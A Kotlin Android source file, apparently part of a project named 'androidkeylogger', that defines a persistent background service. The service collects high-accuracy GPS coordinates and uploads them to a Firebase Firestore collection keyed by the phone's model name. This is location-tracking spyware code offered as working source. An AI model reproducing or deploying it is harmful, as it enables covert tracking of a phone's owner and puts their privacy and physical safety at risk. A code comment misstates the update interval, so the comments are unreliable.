package com.azamovhudstc.androidkeylogger.service

import android.Manifest
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.LocationListener
import android.location.LocationManager
import android.net.ConnectivityManager
import android.os.IBinder
import android.util.Log
import android.widget.Toast
import androidx.core.app.ActivityCompat
import com.azamovhudstc.androidkeylogger.model.LocationData
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.firebase.firestore.FirebaseFirestore
import com.google.gson.Gson
import java.io.File
import java.io.FileWriter
import java.io.IOException

class LocationService : Service() {

    private lateinit var locationManager: LocationManager
    private lateinit var locationListener: LocationListener
    private lateinit var firestore: FirebaseFirestore

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startLocationUpdates()
        return START_STICKY
    }

    override fun onCreate() {
        super.onCreate()
        firestore = FirebaseFirestore.getInstance()
    }

    override fun onDestroy() {
        super.onDestroy()
    }
    private fun startLocationUpdates() {
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager

        val locationRequest = LocationRequest.create().apply {
            interval = 10000 // Bir soniya ichida yangilanish
            fastestInterval = 500 // Eng tezkor yangilanish intervali
            priority = LocationRequest.PRIORITY_HIGH_ACCURACY // Yer aniqlashning darajasi
        }

        val locationCallback = object : LocationCallback() {
            override fun onLocationResult(p0: LocationResult) {
                p0 ?: return
                for (location in p0.locations) {
                    if (location.hasAccuracy() && location.accuracy <= 1) {
                        // 1 metrdan kam o'zgarishni eshitish
                        val locationData = LocationData(location.latitude, location.longitude, location.accuracy)
                        if (isInternetAvailable(this@LocationService)) {
                                uploadDataToFirestore(locationData)

                        }

                        Log.d("EVENT", "onLocationResult:${p0.lastLocation?.latitude} ")
                        Log.d("EVENT", "onLocationResult:${p0.lastLocation?.longitude} ")
                        Toast.makeText(
                            this@LocationService,
                            "Location changed by more than 1 meters",
                            Toast.LENGTH_SHORT
                        ).show()
                    }
                }
            }
        }

        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return
        }

        fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, null)
    }
    private fun isInternetAvailable(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }
    private fun uploadDataToFirestore(locationData: LocationData) {
        val locationMap = mapOf(
            "latitude" to locationData.latitude,
            "longitude" to locationData.longitude,
            "accuracy" to locationData.accuracy
        )
        val modelDocRef = firestore.collection("locations").document(android.os.Build.MODEL)
        modelDocRef.get()
            .addOnSuccessListener { documentSnapshot ->
                if (documentSnapshot.exists()) {
                    modelDocRef.update(locationMap)
                        .addOnSuccessListener {
                        }
                        .addOnFailureListener {
                        }
                } else {
                    modelDocRef.set(locationMap)
                        .addOnSuccessListener {
                        }
                        .addOnFailureListener {
                        }
                }
            }
            .addOnFailureListener {
            }
    }


}
